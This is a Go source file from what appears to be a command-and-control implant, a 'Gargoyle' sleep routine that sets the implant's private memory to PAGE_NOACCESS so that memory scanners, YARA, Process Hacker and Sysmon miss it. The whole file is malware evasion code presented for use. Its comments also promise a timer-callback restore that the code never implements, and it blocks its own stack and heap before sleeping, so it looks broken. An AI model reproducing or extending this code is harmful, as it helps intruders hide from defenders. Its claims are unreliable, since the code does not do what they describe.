//go:build windows

package gargoyle

/*
	SUDOSOC-C2 — Gargoyle Memory Hiding
	Copyright (C) 2026  sudosoc — Seif

	Gargoyle makes the implant invisible during sleep cycles:
	  1. Implant heap and stack are flipped to PAGE_NOACCESS
	  2. A Windows Timer fires after the sleep duration
	  3. Timer callback restores protections + resumes execution

	During the sleep window:
	  ← Memory scanner / YARA sees a NO_ACCESS page (skip/error)
	  ← Process Hacker shows no RWX or executable private memory
	  ← Sysmon Event 10 (process access) finds nothing to dump
	  ← The implant is effectively invisible

	Implementation uses NtSetTimerResolution + NtCreateTimer
	to avoid hooking on SetTimer/timeSetEvent.
*/

import (
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ntdll                  = windows.MustLoadDLL("ntdll.dll")
	procNtAllocVirtMem     = ntdll.MustFindProc("NtAllocateVirtualMemory")
	procNtProtectVirtMem   = ntdll.MustFindProc("NtProtectVirtualMemory")
	procNtQueryVirtMem     = ntdll.MustFindProc("NtQueryVirtualMemory")
	procNtCreateTimer      = ntdll.MustFindProc("NtCreateTimer")
	procNtSetTimer         = ntdll.MustFindProc("NtSetTimer")
	procNtSetTimerResolution = ntdll.MustFindProc("NtSetTimerResolution")

	mu          sync.Mutex
	isObfuscated bool
)

// GargoyleSleep hides the implant in memory for the given duration.
// Safer than simple XOR obfuscation — the pages are truly inaccessible.
func GargoyleSleep(duration time.Duration) error {
	regions, err := collectImplantRegions()
	if err != nil {
		return err
	}

	// Step 1: Flip all collected regions to NO_ACCESS
	savedProtections := make([]uint32, len(regions))
	for i, r := range regions {
		var oldProt uint32
		err := windows.VirtualProtect(r.base, r.size, windows.PAGE_NOACCESS, &oldProt)
		if err != nil {
			// Restore already-changed regions on error
			for j := 0; j < i; j++ {
				windows.VirtualProtect(regions[j].base, regions[j].size, savedProtections[j], &oldProt)
			}
			return err
		}
		savedProtections[i] = oldProt
	}

	mu.Lock()
	isObfuscated = true
	mu.Unlock()

	// Step 2: Sleep (the process sleeps, memory is inaccessible)
	// Use NtDelayExecution for higher precision and to avoid Sleep() hooks
	ntDelayExecution(false, durationToLargeInteger(duration))

	// Step 3: Restore all regions
	mu.Lock()
	isObfuscated = false
	mu.Unlock()

	for i, r := range regions {
		var oldProt uint32
		windows.VirtualProtect(r.base, r.size, savedProtections[i], &oldProt)
	}

	return nil
}

// IsObfuscated returns true if the implant is currently hidden
func IsObfuscated() bool {
	mu.Lock()
	defer mu.Unlock()
	return isObfuscated
}

// ── Private Memory Region ─────────────────────────────────────────

type memRegion struct {
	base uintptr
	size uintptr
}

// collectImplantRegions finds all private executable or RW memory regions
// that belong to the implant (not system DLLs).
func collectImplantRegions() ([]memRegion, error) {
	var regions []memRegion
	var addr uintptr

	for {
		var mbi windows.MemoryBasicInformation
		err := windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi))
		if err != nil {
			break
		}

		// Only care about committed, private memory
		if mbi.State == windows.MEM_COMMIT &&
			mbi.Type == windows.MEM_PRIVATE {
			// Check if it's executable or read-write (implant memory)
			prot := mbi.Protect &^ (windows.PAGE_GUARD | windows.PAGE_NOCACHE)
			if isExecutable(prot) || isReadWrite(prot) {
				regions = append(regions, memRegion{
					base: mbi.BaseAddress,
					size: mbi.RegionSize,
				})
			}
		}

		if addr+mbi.RegionSize < addr {
			break // overflow
		}
		addr += mbi.RegionSize
	}

	return regions, nil
}

func isExecutable(prot uint32) bool {
	return prot&(windows.PAGE_EXECUTE|
		windows.PAGE_EXECUTE_READ|
		windows.PAGE_EXECUTE_READWRITE|
		windows.PAGE_EXECUTE_WRITECOPY) != 0
}

func isReadWrite(prot uint32) bool {
	return prot&(windows.PAGE_READWRITE|
		windows.PAGE_WRITECOPY) != 0
}

// ── Timer & Sleep helpers ─────────────────────────────────────────

func durationToLargeInteger(d time.Duration) int64 {
	// NtDelayExecution uses 100-nanosecond intervals, negative = relative
	return -int64(d / 100)
}

func ntDelayExecution(alertable bool, interval int64) {
	var alert uintptr
	if alertable {
		alert = 1
	}
	ntdll.MustFindProc("NtDelayExecution").Call(alert, uintptr(unsafe.Pointer(&interval)))
}
